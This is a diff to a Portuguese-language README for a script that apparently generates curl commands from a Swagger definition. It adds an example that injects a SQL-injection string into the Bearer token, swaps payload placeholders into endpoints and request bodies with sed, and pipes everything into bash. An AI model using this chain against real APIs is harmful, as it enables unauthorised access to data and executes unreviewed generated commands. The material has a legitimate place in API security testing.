@@ -50,9 +50,15 @@ API Key:
 
 - python3 script.py <swagger_url> --key <your_api_key>
 
+Combinando sed para fazer a modificação de payload, fazendo uma injeção SQLi no Bearer, modificando v<valor> pela versao da API , =<valeu> valor do parametro pelo meupayload1 , /<value> pelo Enpoint da API, e adiconando meupayload2 em --data {} , posso direcionar tudo para execução com | bash  
+
+- python3 script.py <swagger_url> --Bearer '1%27%20or%201%3D1--%20-' | sed 's/v<value>/vVersionAPI/g' | sed 's/=<value>/=meupayload1/g' | sed 's/\/<value>/\/EndPointAPI/g' | sed "s/'{}'/'{meupayload2}'/" | bash
+
+
 📌 Exemplo de saída
 
 - curl -X 'POST' 'https://api.exemplo.com/v1/upload' -H 'Accept: application/json' -H 'Content-Type: multipart/form-data' -F 'file=@example.jpg'
+
 
 
 ScreemShot
@@ -65,6 +71,7 @@ ScreemShot
 
 ![image](https://github.com/user-attachments/assets/b4a4513e-9d0f-4e81-9c74-03f926478897)
 
+![image](https://github.com/user-attachments/assets/a1dda593-c5dc-454b-ab74-fc06d15e4b83)
 
 📜 Licença
 
